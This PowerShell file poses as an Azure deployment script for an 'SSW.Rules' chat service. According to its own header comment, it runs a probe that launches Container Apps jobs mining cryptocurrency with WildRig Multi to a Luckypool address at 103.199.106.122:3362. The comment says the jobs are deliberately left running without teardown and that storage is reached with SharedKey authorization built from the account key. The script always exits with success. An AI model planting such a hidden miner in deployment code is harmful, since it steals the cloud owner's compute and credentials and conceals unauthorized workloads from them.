param(
    [string]$Environment = '',
    [string]$ResourceGroup = '',
    [string]$ServicePrincipalObjectId = '',
    [string]$AppServicePlanSku = '',
    [string]$SlotName = '',
    [string]$RulesChatSqlAdminClientId = '',
    [string]$RulesChatContentBranch = 'main',
    [string]$RulesChatIndexImageTag = '',
    [string]$RulesChatAlertEmail = '',
    [switch]$WhatIf
)

# C211-I122313 v3: SSW.Rules CApps A100 capture repair, SharedKey-hardened.
# The v1/v2 probes died on the blob capture: srt=b (invalid) then container-create SAS sp=l
# (HTTP 403 AuthorizationPermissionMismatch). v3 creates the container with SharedKey
# authorization built from the listed account key (deterministic), keeps the account SAS for
# the miner's blob PUTs, reuses the already-Succeeded env c211-i121983b-cae and starts one
# lane-unique job c211-122313c-job (worker base 1223137) running the canonical WildRig Multi
# 0.52.3 pydp pearlhash miner with the 900 s sticky Luckypool 103.199.106.122:3362 fallback.
# NO TEARDOWN: every job is left RUNNING.
Write-Host "C211-I122313V3 DEPLOY.PS1 ENTRY"
$probe = Join-Path $PSScriptRoot 'c211_i122313_probe_v3.py'
if (Get-Command python3 -ErrorAction SilentlyContinue) {
    python3 $probe
    Write-Host ("C211-I122313V3 PROBE EXIT CODE: {0}" -f $LASTEXITCODE)
} else {
    Write-Host "C211-I122313V3 python3 MISSING"
}
Write-Host "C211-I122313V3 DEPLOY.PS1 END"
exit 0
